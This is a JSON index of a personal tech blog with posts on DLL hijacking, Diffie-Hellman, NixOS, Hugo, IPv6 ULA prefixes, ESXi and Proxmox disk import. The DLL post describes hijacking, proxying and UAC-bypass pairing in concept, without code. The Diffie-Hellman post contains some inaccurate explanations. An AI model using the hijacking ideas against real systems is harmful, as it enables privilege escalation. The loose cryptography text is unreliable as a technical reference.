[{"content":"Today I was looking at something new to learn and I came accross some material on DLL Hijacking. Previously I was only really aware of DLL search order hijacking, but I was interested to see that theres actually several varients to this idea. It may be best to first explain what a DLL is before talking about methods of manipulation. A DLL is a shared object or a snippet of code that several applications and operating system components can import for many common functions as to not have to re-invent the wheel on many things. Since many vital applications and operating system components need these DLLs, there is an opportunity for arbitrary code execution if you can somehow influence an application to load your DLL. There are many techniques to do so, many of them are very similar so I categorize them as such:\nReplacing DLLS: This is the easiest concept to understand as you simply replace the legitimate DLL with your compromised one. This typically requires a higher level of privilege as many DLLs reside in privileged locations. This can be taken a step further with DLL Proxying, which consists of trojanizing a DLL, which can forward calls to the intended location as well as intercept and interpret calls itself. I would like to talk more about DLL Proxying in a later blog post because it is the coolest one in my opinion, but until then you can check out this blog post: https://kevinalmansa.github.io/application%20security/DLL-Proxying/ . Hijacking Priority: Windows has a specific order in which is searches for libraries as many versions of the same DLL can exist on a system, the order itself isn\u0026rsquo;t as important but you can read more about it here. What is more important is if you can place a cmpromised DLL in a location higher in the search priority than the legitimate application, then your compromised DLL will be loaded instead. This is referred to as DLL search order hijacking and many flavors of it exist that do it in slightly different ways, you can read more about them here. At the time of writing (20250211) Windows has over opportunities for DLL Hijacking. You can scan a system using the Sysinternals Procmon utility to identify them, the blog post linked above also has a helper script that outputs your candidates to a CSV: https://github.com/wietze/windows-dll-hijacking/tree/master/1_finding_candidates . When Hijacking DLLs, you are largely subject to the privilege levels that the application that loads the DLL has. This technique can be combined with User Accont Control (UAC) bypass to elevate privileges while also bypassing the need for the user to confirm. There are many sneaky techniques such as taking advantage of the \u0026ldquo;friendliness\u0026rdquo; in the windows command environment to include characters such as white spaces that are eliminated upon evaluation this is a pretty good blog post that goes more in depth. I have only scratched the surface but I would like to explore more on these in the future as it is an incredibly interesting concept.\n","date":"2025-02-06","id":0,"permalink":"/blog/20250206/","summary":"Today I was looking at something new to learn and I came accross some material on DLL Hijacking.

Below is a simple graphic that I made that illustrates the process of the key exchange.\nSo what does this mean? Well asymetric cryptography is built upon the idea of creating a shared secret independently without passing it over the public internet. Diffie-Helman arised as a method of doing so. So how does this work you ask? Our first subject Alice comes up with a random number, for illustration purposes this number is small, but his is usually a very large number. Bob indenpendently does the same, both of these numbers are unique and never shared and will be regfered to as a private key. What is shared are two other numbers g and n, these numbers can be whatever as long as g is small and prime and n is very large. These numbers will be used in a mathematcal function to create something they can share, a piblic key. This public key can easily be derived if you have the private key, but the math doesnt work that well the other way around, this is due to the modulus operation. Modulus is simply the remander left over after a number is divided into another one evenly as many times as possibly. It is improbable for me to know how many times the number fit into the other one cleanly with just the remainder without simply guessing every possibility. If our private keys and n operator are large enough, this will again be very impractical. The colors here are to represent that our numbers as they are combined. While I know that yellow is in the public domain and alice\u0026rsquo;s public key is orange, i dont know the exact shade of red or quantity that she used to make this orange which would make it very difficult to replicate without trial and error.\nNow that we have established both public and private keys, our partiies can exchange their public keys and add their private keys to the result with the same method used to create the public keys. The result should independently create the same key, which is apparent as both users have arrived to the number 7 and the color brown. As the numbers increase in size, the likelyhood that the symetric key will be the same as a user\u0026rsquo;s private key decreases as well.\n","date":"2025-01-09","id":1,"permalink":"/blog/20250109/","summary":"Today I was looking into some stuff for SSH and I wanted to know more about the maths behind how diffie helman works and since its just always something I took for granted so today I learned.

I started using NixOS recently because I would like to incorporate declarative and immutable operating systems into my research. I was introduced to NixOS via one of my favorite podcasts Linux Unplugged. I wasn\u0026rsquo;t initially sold on it because it sounded like a fad, but so far its pretty cool. This is how I understand it.\nTheres a difference between Nix and NisOS. Nix is a package manager. At the time of writing it has eclipsed the AUR as the largest Linux repo. You can use Nix and not have to use NixOS, ive heard people using it on other Linux Operating systems and even on Mac. I need to figure out how the packaging works exactly so that I can understand why this works, because I think that\u0026rsquo;s pretty powerful that it does. NixOS is the entire operating system. From what I understand NixOS is atomic, meaning all changes to the operating system happen at once so updates work in a copy-on-write fashion where updates are applied as an entire system snapshot. The system itself is read only to the actual user and any actual system changes are made via the /etc/nixos/configuration.nix file. Any time you make changes to your system it is built from scratch and put in a read only state. Files in your home directory are safe from this destructive change meaning you can roll back to a previous iteration of you OS but still keep your files.\nNow lets talk about Flakes, I am by no means an expert on this, nor am I sure that I even understand it fully quite yet but flakes can allow an additional layer of reproducibility to your NixOS. Because you dont specify package versions when you download packages, if I wanted to work on a specific config such a jellyfin server sitting behind an nginx proxy, I could create a configuration file, in this case a flake.nix to make sure these two things are installed and configured correctly. This setup has no guarantees to ensure that the versions are the same when someone else uses my config file as they will simply be downloading the lastest versions of the applications. Flakes step in to help that by using a system of inputs and outputs which define the repository locations and the development environments respectively (im sure it does other stuff too). It then goes about creating a flake.lock file from your configuration, which will be a listing of the exact versions of the applications installed ensuring that when someone else installs it they will get the exact same setup and not just the latest version.\nTo see nix in action check out my NixOS config here. It is a pretty basic setup so far, but I hope to add more in the future as I understand it more.\n","date":"2025-01-02","id":2,"permalink":"/blog/20250102/","summary":"So I didn\u0026rsquo;t do anything today so I\u0026rsquo;m going to take today to write about NixOS.

The intention of this blog is less of an exercise in writing about my life and more of a exercise in making a habit of documentation. I plan to write daily about lessons I learned about computers that day and I\u0026rsquo;m sure there will be a non-computer related blog or two. When I implement tagging and search, I will make sure that things are tagged appropriately. Now let\u0026rsquo;s get into the first blog post:\nI would like to update my site from my current Google Sites posting to a site dynamically built via Hugo, delivered through a GitHub CI/CD pipeline (maybe a Gitlab one in the future), and ultimately served over either GitHub Pages or Cloudflare Pages. I settled on Hugo after I heard about it on one of my favorite podcasts (Linux Unplugged)[https://linuxunplugged.com/] since they have a similar setup for their site (JupiterBroadcasting.com)[https://github.com/JupiterBroadcasting/jupiterbroadcasting.com] I plan to take it further, mainly as an academic exercise, but also to have a method of deploying my site that allows me a bit more flexibility and a lot more pizzaz. Once I learn the GitHub side of things, I plan to tear it down and rebuild it on Gitlab Pages for a fully open-source tech stack.\nSo far I installed Hugo, but I kept running into issues working through the QuickStart for the theme I was trying to use which led to some frustration. From what I understand there\u0026rsquo;s a couple different ways for me to run Hugo on my system\nInstall it from the package repo This is my usual go to. I was attempting this on my Ubuntu 24.04 laptop but I ran into a couple issues. Hugo is written in (Go)[https://go.dev/] and as a consequence of that, the things you want to do in are dependent on the version of Go you have on your system The package maintainers are pretty good at ensuring the version of Hugo in the package repo does not rely on a Go version that isn\u0026rsquo;t in the package repo. Theme developers are not the same (and nor should they have to be), and that\u0026rsquo;s the issue that I face today. In order to install and run the theme so that I can edit and develop locally, I need a version of Go that is more updated than the one in the repos. I usually don\u0026rsquo;t have this issue much, but choosing an LTS has really bit me. Install the Snap Usually if something like this happens, I check the Snap repository because projects are sometimes nice enough to make a snap available that has all the necessary components bundled up. A lot of people don\u0026rsquo;t like snaps, but I\u0026rsquo;m pretty happy using them when they\u0026rsquo;re available. I usually keep systems installed for long periods of time and will upgrade instead of doing a nuke and pave when the time has come for me to do so. Snaps have helped me reduce overall system crud to aid in this endeavor. Unfortunately this did not work either since the Hugo snap is bundled with Go and that version is older too, installing the Go snap (which is the correct version) doesn\u0026rsquo;t really help with that either because the snap isn\u0026rsquo;t looking there. Build From Source I don\u0026rsquo;t like building from source, because cleaning up after myself sucks, also I want to upgrade my packages with the system. Maybe I just need to learn the process better to get more comfortable with it These were my issues with Hugo. My solution was to use NixOs I have NixOS installed on an old laptop because I\u0026rsquo;m trying to learn more about it to integrate immutable and declarative operating systems into my current research for school and I have got to say that its pretty incredible. Getting this project started on NixOS was as simple as adding a couple lines to my config to install Hugo, Go, and NodeJS and running through the QuickStart guide. While I understand that the fix was not unique to NixOs, and that I would have had similar success with a rolling distro like Arch Linux I had NixOs already around and it worked well, I\u0026rsquo;m becoming more and more sold on the idea of NixOS so I\u0026rsquo;m happy to be finding more uses for it in my daily life.\n","date":"2025-01-01","id":3,"permalink":"/blog/20250101/","summary":"Hello, this is the beginning of my (somewhat) daily blog.

A pretty easy way to do that is with the following one liner:\nprintf $(echo -n `date +%s%N` \u0026amp;\u0026amp; cat /var/lib/dbus/machine-id) | sha1sum | head -c 40 | tail -c 10 This will leave you with a 10 digit (5 byte) string that you can append to the fd (or fc) prefix to look like this fdcc:9a66:f7b2:: because this is an insanely large prefix, best practice is to reduce it to a /64 for simplicity\u0026rsquo;s sake.\n","date":"2023-11-23","id":12,"permalink":"/blog/00_legacy_random_ipv6/","summary":"If you\u0026rsquo;re anything like me and (and a good other portion of the internet) you don\u0026rsquo;t want to be bothered with IPv6 addressing because \u0026ldquo;IPv4 still works\u0026rdquo; but eventually its time to grow up and realize you need to start becoming more familiar with IPv6 outside of basic textbook knowledge and today I\u0026rsquo;m gonna teach you how to create a random IPv6 private range for if you need to set up VLANs, VPN tunnels, or whatever.","tags":["IPv6","RFC4193","Networking","Legacy"],"title":"Creating a random private IPv6 Range"},{"content":"When you\u0026rsquo;re running ESXI without vCenter, sometimes really niche things come up and you have situations that are kind of a pain without the appropriate management software so sometimes you gotta be a little janky.\nSo Primarily you\u0026rsquo;re going to want to power off the VM you want to clone.\nThen you want to right click the VM and chose Edit Settings.\nIn the Virtual Hardware tab take not of the name and location of your Disk File.

Different hypervisors use different file formats to represent VM images and due to the fact that Proxmox uses Qemu (Quick Emulator)/KVM (Kernel-based Virtual Machine) to provide virtualization, it in turn uses Qcow2 (Qemu Copy-On-Write) as the storage file format for virtual machines data. The process to move Qcow2 files into Proxmox may not be as straight forward as it is on VMware, but its still a relatively painless process.\nEnvironment Setup# First, you\u0026rsquo;re going to want to need a place to store the Qcow2 files that you\u0026rsquo;re going to copy and virtualize. Its probably best to put them near where VM ISOs and container images are stored like such:\nmkdir /var/lib/vz/template/qcow2 After this is created you can move the qcow2 file to your proxmox instance however you see fit. If you don\u0026rsquo;t have it saved quite yet, it may be easiest to simply use wget to pull the image from whatever repo you\u0026rsquo;re hoping to grab it from so save the bandwidth of saving it to your disk and then moving it to Proxmox.\nCreating the VM# We will begin setup by going to the Create VM action.\nFrom here in the General tab, we can give our VM a name, it should be automatically assigned an unique VM ID that you will need to notate for later.\nIn the OS tab, ensure that you click the Do not use any media radio button, from there you can either leave the guest OS as the default Linux, or change it to Other to avoid any possible default configuration issues.\nIn the System tab we should be able to leave all of the defaults here.\nIn the Disks tab we should change our VM\u0026rsquo;s size to how large we want it to be in Disk Size. You can change the Format to Qemu Image Format but the default Raw format should work, my Proxmox wouldn\u0026rsquo;t give me the option to change from raw.\nIn the CPU tab, give your VM the compute resources that it needs.\nIn the Memory tab, give your VM the memory that it needs.\nIn the Networking tab, ensure your VM has the networking capabilities that it requires if you would like it to connect over the network.\nFrom there you can hit the Finish button to create your VM.\nImporting Disks# Up to this point, we\u0026rsquo;ve simply created a VM without a bootable operating system. From here we will actually import the Qcow2 image and therefore make our VM usable. Ensure you have these pieces of information handy: VM ID, Proxmox Storage Cluster Name(usually just local or local-zfs), absolute file path of the QCOW2 image.\nFrom your terminal, importing the image is fairly easy using the built-in command:\nqm importdisk \u0026lt;VM_ID\u0026gt; \u0026lt;QCOW2_FILE\u0026gt; \u0026lt;PROXMOX_ STORAGE\u0026gt; After that, watch the transfer fly.\nSwapping Disks# Click on your VM and then go to Hardware \u0026gt; Click the Unused Disk at the bottom of the hardware array \u0026gt; and then click the Edit option at the top.\nFrom there we will change the Bus Device to VirtIO Block to ensure our VM can take advantage of the best possible performance.\nNow we need to change the boot order, so go to Options \u0026gt; Boot Order and move the VirtIO disk to the top. Click OK to save.\nFrom here you should be able to boot your VM.
